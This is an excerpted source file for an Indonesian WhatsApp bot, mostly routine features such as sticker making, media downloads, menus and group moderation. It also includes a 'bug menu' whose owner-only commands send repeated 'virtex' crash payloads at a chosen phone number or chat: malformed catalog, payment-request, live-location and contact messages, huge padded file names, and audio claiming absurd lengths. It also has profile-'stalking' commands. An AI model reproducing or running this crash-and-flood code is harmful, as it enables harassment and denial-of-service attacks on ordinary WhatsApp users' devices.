...
module.exports = jarot = async (jarot, m, chatUpdate, store) => {
try {
        ...
        const botNumber = await jarot.decodeJid(jarot.user.id)
        const itsMejarot = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        ...
        const Creatorjarot = new Date().getTime()
        const jarotBotWA = UltahCreator - Creatorjarot
        const kayhari = Math.floor( jarotBotWA / (1000 * 60 * 60 * 24));
        const kayjam = Math.floor( jarotBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const kaymenit = Math.floor( jarotBotWA % (1000 * 60 * 60) / (1000 * 60))
        const kaydetik = Math.floor( jarotBotWA % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await jarot.groupMetadata(m.chat).catch(e => {}) : ''
    	...
    	const banUser = await jarot.fetchBlocklist()
...
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - Oscar Bot '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}
...
if (isCmd && !itsMejarot) antiSpam.addFilter(from)
...
if (m.sender.startsWith('212')) return jarot.updateBlockStatus(m.sender, 'block')
if (m.key.remoteJid == 'status@broadcast') return jarot.sendReadReceipt(from, m.sender, [m.key.id])

async function sendjarotMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await jarot.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
jarot.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await jarot.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
const sendvn = (teks) => {
jarot.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
...
jarot.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6285850539404@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
const reply = (teks) => {
jarot.sendMessage(from, { text: teks ,
contextInfo:{
...
"fileName": `jarot Bot WhatsApp${ngazap(prefix)}`,
...
for (let i of owner) {
list.push({
displayName: await jarot.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await jarot.getName(i + '@s.whatsapp.net')}\n
FN:${await jarot.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
...
"message": {
"pollCreationMessage": {
"name": `jarot Bot ${virus}${virtex(prefix)}`,
"options": [
	{
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI jarot BOT"
	}
],
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `jarot Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "jarot Bot WhatsApp${ngazap(prefix)}",
...
if (command) {
jarot.sendPresenceUpdate(jd, from)
jarot.readMessages([m.key])
}
...
.on('finish', async () => {
await jarot.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
...
.on('finish', async () => {
await jarot.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
const botzjarot = "6285850539404@s.whatsapp.net"
...
𝘚𝘢𝘺𝘢 𝘖𝘴𝘤𝘢𝘳 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.

┏─────────────────⬣
┆ 𝑯𝒂𝒊, ${pushname} 👋
┗┬──────────────┈ ⳹
┏┆♠︎ Nama ${itsMejarot ? 'Owner' : 'User'} : ${pushname}
┃┆♠︎ Nomor ${itsMejarot ? 'Owner' : 'User'} :
┃┆♠︎ ${sender.split("@")[0]}
┃┆♠︎ Jumlah User : ${pendaftar.length} User
┃┆♠︎ Status : ${itsMejarot ? 'Owner' : 'User'}
┃┆♠︎ Status Premium : ${isPrem ? 'Premium' : 'Free User'}
┃┆♠︎ Runtime Bot :
┃┆♠︎ ︎${runtime(process.uptime())}
┃┆♠︎ Speed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
┗─────────────────⬣
...
𝗢𝗿𝗮𝗻𝗴 𝗧𝘂𝗮
𝗢𝘀𝗰𝗮𝗿 𝗕𝗼𝘁`,
mentions : [sender, botzjarot, mark],
footer: `Created By @${botzjarot.split("@")[0]}
...
async function sendFile(jid, media, options={}) {
        ...
        return jarot.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }
...
async function genProfile(jarot, m) {
   let font = await Jimp.loadFont('./name.fnt'), 
     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
     avatar = await Jimp.read(await jarot.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
     status = (await jarot.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
...
return jarot.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
...
async function replyprem(teks) {
    ...
    return jarot.sendButtonText(m.chat, buttons, teks, `Jangan Mau Free Yah :(`, m)
}

if (/hehe/g.test(m.body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
jarot.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
}
...
await jarot.sendButtonText(m.chat, buttons, `Auto Download Tiktok

Title : ${atdl.title}`, `Auto Downloader By jarot`, ftext)
}
}
...
let encmedia = await jarot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime) && !/webp/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await jarot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

if (m.isGroup && !m.key.fromMe && !itsMejarot && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
jarot.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
jarot.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMejarot && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
jarot.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
jarot.groupParticipantsUpdate(m.chat, [sender], 'remove')
...
jarot.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
jarot.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}
...
if (!isCmd && isAlreadyjarotList(chath, dblist)) {
var getkaydata = getDatajarotList(chath, dblist)
if (getkaydata.isImage === false) {
jarot.sendMessage(m.chat, { text: sendjarotList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
jarot.sendImage(m.chat, buff, `${getkaydata.response}`, m)
}
}
...
rows: [
{title: `𝘚𝘦𝘮𝘶𝘢 𝘗𝘦𝘳𝘪𝘯𝘵𝘢𝘩`, rowId: `${prefix}allmenu`},
{title: `𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶`, rowId: `${prefix}ownermenu`},
{title: `𝘖𝘵𝘩𝘦𝘳 𝘔𝘦𝘯𝘶`, rowId: `${prefix}othermenu`},
{title: `𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘔𝘦𝘯𝘶`, rowId: `${prefix}downloadmenu`},
{title: `𝘉𝘶𝘨 𝘔𝘦𝘯𝘶`, rowId: `${prefix}bugmenu`},
{title: `𝘎𝘳𝘰𝘶𝘱 𝘔𝘦𝘯𝘶`, rowId: `${prefix}groupmenu`},
{title: `𝘍𝘶𝘯 𝘔𝘦𝘯𝘶`, rowId: `${prefix}funmenu`},
{title: `𝘚𝘵𝘢𝘭𝘬𝘦𝘳 𝘔𝘦𝘯𝘶`, rowId: `${prefix}stalkermenu`},
{title: `𝘍𝘰𝘵𝘰 𝘮𝘦𝘯𝘶`, rowId: `${prefix}randfotomenu`},
{title: `𝘝𝘪𝘥𝘪𝘰 𝘔𝘦𝘯𝘶`, rowId: `${prefix}randvideomenu`},
{title: `𝘔𝘦𝘯𝘶 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰`, rowId: `${prefix}textpromenu`},
{title: `𝘗𝘩𝘰𝘵𝘰 𝘰𝘹𝘺 𝘔𝘦𝘯𝘶`, rowId: `${prefix}photooxymenu`},
{title: `𝘌𝘱𝘩𝘰𝘵𝘰 𝘔𝘦𝘯𝘶`, rowId: `${prefix}ephoto360menu`},
{title: `𝘊𝘦𝘳𝘱𝘦𝘯 𝘔𝘦𝘯𝘶`, rowId: `${prefix}cerpenmenu`},
]}]
...
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(jarot => jarot.user).map(jarot => jarot.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await jarot.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
jarot.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'shutdown':
if (!itsMejarot) return reply(mess.owner)
reply(`Bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await jarot.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
jarot.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu':{
const tyds = await jarot.sendMessage(from, buttonLocnya, { quoted : m })
jarot.sendMessage(from, listMenuMessage, { quoted: tyds })
}
break
case 'allmenu':
sendjarotMessage(from, { 
...
"sourceUrl": 'https://chat.whatsapp.com/IqZke0cAG6G3iVsnB9myfL'
}
}
})
break
...
setTimeout(() => {
jarot.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
break
case 'sc': case 'scriptbot': case 'scbot':{
jarot.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Beli Di Owner @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
}
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply Pesannya!!')
let wokwol = await jarot.serializeM(await m.getQuotedObj())
...
jarot.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
fs.unlinkSync(rano)
})
})
break
...
aj = await igstalk(`${q}`)
jarot.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalking Instagram \\*
...
jarot.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Stalking Github \\*
...
jarot.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
}
break
case 'join': {
if (!itsMejarot) return reply(mess.owner)
...
await jarot.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'toonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await jarot.downloadAndSaveMediaMessage(quoted)
jarot.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await jarot.downloadAndSaveMediaMessage(quoted)
jarot.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'autodltt':
...
await jarot.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
}
break
case 'autosticker':
if (!itsMejarot) return reply(mess.owner)
...
await jarot.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
}
break
case 'bc':
if (!itsMejarot) return reply(mess.owner)
...
for (let yoi of anu) {
jarot.sendMessage(yoi,{text:`INFORMASI
Buat User Bot
...
mentions: await jarot.parseMention(teskd),
sections
}
jarot.sendMessage(from, listMessage, {quoted:m})
} catch {
...
jarot.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'hentaivid': {
if (!isPrem) return replyprem(mess.premium)
...
jarot.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
...
await jarot.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
Seseorang Temanmu
(Pengirim Rahasia)
...
await jarot.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : m })
...
break
case 'leave':{
if (m.isGroup && itsMejarot && command == "leave") return jarot.groupLeave(from)
...
if (other != "") jarot.sendMessage(other, {
text: "Bye..."
})
...
case 'antilink':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMejarot) return reply(mess.admin)
...
await jarot.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
}
break
case 'antiwame':
if (!m.isGroup) return reply(mess.group)
...
await jarot.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
...
await jarot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'closetime':
if (!m.isGroup) return reply(mess.group)
...
jarot.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
case 'opentime':
...
jarot.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
break
case 'kick': {
...
await jarot.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
...
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jarot.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
...
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jarot.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
...
jarot.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
...
jarot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
...
jarot.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
}
break
case 'tiktokaudio':{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
let tytyd = await tiktokdl(q)
jarot.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'googles': {
...
const sendMsg = await jarot.sendMessage(from, buttonNya)
break
case 'play':{
...
owned = '6285850539404@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
jarot.sendMessage(m.chat, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...
jarot.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?
...
case 'addprem':
if (!itsMejarot) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285850539404`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await jarot.onWhatsApp(prrkek)
...
let delb = await jarot.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
...
let ceknye = await jarot.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
...
case 'listpremium':
teks = '*List Premium*\n\n'
for (let jarot of prem) {
teks += `- ${jarot}\n`
}
teks += `\n*Total : ${prem.length}*`
jarot.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setppbot': {
if (!itsMejarot) return reply(mess.owner)
...
var medis = await jarot.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/kay`) {
...
var memeg = await jarot.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
...
const sendMsge = await jarot.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!itsMejarot) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
...
if (/image/.test(mime)) {
media = await jarot.downloadAndSaveMediaMessage(quoted)
...
if (/image/.test(mime)) {
let media = await jarot.downloadAndSaveMediaMessage(quoted)
let encmedia = await jarot.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
mee = await jarot.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
jarot.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
...
try {
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
meeh = await jarot.downloadAndSaveMediaMessage(quoted)
memh = await uptotelegra(meeh)
gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
jarot.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
...
mee = await jarot.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
jarot.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
break
case 'toaudio':
...
mee = await jarot.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
jarot.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
...
mee = await jarot.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
jarot.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
break
case 'smeme':
...
jarot.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
break
case 'cekme':
					neme = args.join(" ")
					bet = `${sender}`
...
jarot.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
...
jarot.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
...
jarot.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
}
break
case 'goblokcek':
case 'jelekcek':
...
jarot.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
reply(mess.succes)
}
break
case 'send':{
...
jarot.sendMessage(num,{text:`hai`},{quoted:lep})
await sleep(1000)
}
...
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
jarot.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
...
if (!itsMejarot) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285850539404`)
jarot.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku jarot', 
...
contextInfo:{
"externalAdReply": {
"title": `jarot Bot ${virus}${virtex(prefix)}`,
"body": `jarot Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `jarot Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
...
case 'jagoanneon' : {
if (!itsMejarot) return reply(mess.owner)
jarot.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `jarot Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: jarot.waUploadToServer })
...
"caption": `jarot Bot ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: num, quoted: lep })
jarot.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendContact(num, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendMessage(num, { 
document: ppnyauser, 
fileName: `🔥 jarot BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `jarot Bot ${virus}${virtex(prefix)}`, `jarot Bot ${virus}${virtex(prefix)}`, `jarot Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `jarot Bot WhatsApp ${virus} ${virtex(prefix)}`,
...
"url": `https://wa.me/6285850539404`
},
"businessOwnerJid": "6285850539404@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
jarot.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jarot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
...
jarot.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendContact(m.chat, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `jarot Bot ${virus}${virtex(prefix)}`, `jarot Bot ${virus}${virtex(prefix)}`, `jarot Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
jarot.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
let hdhe = await jarot.onWhatsApp(nmn)
...
let mnm = await jarot.groupAcceptInvite(fhehfhe)
...
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jarot.groupAcceptInvite(resultny)
jarot.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
...
jumlah = q.split('|')[1]
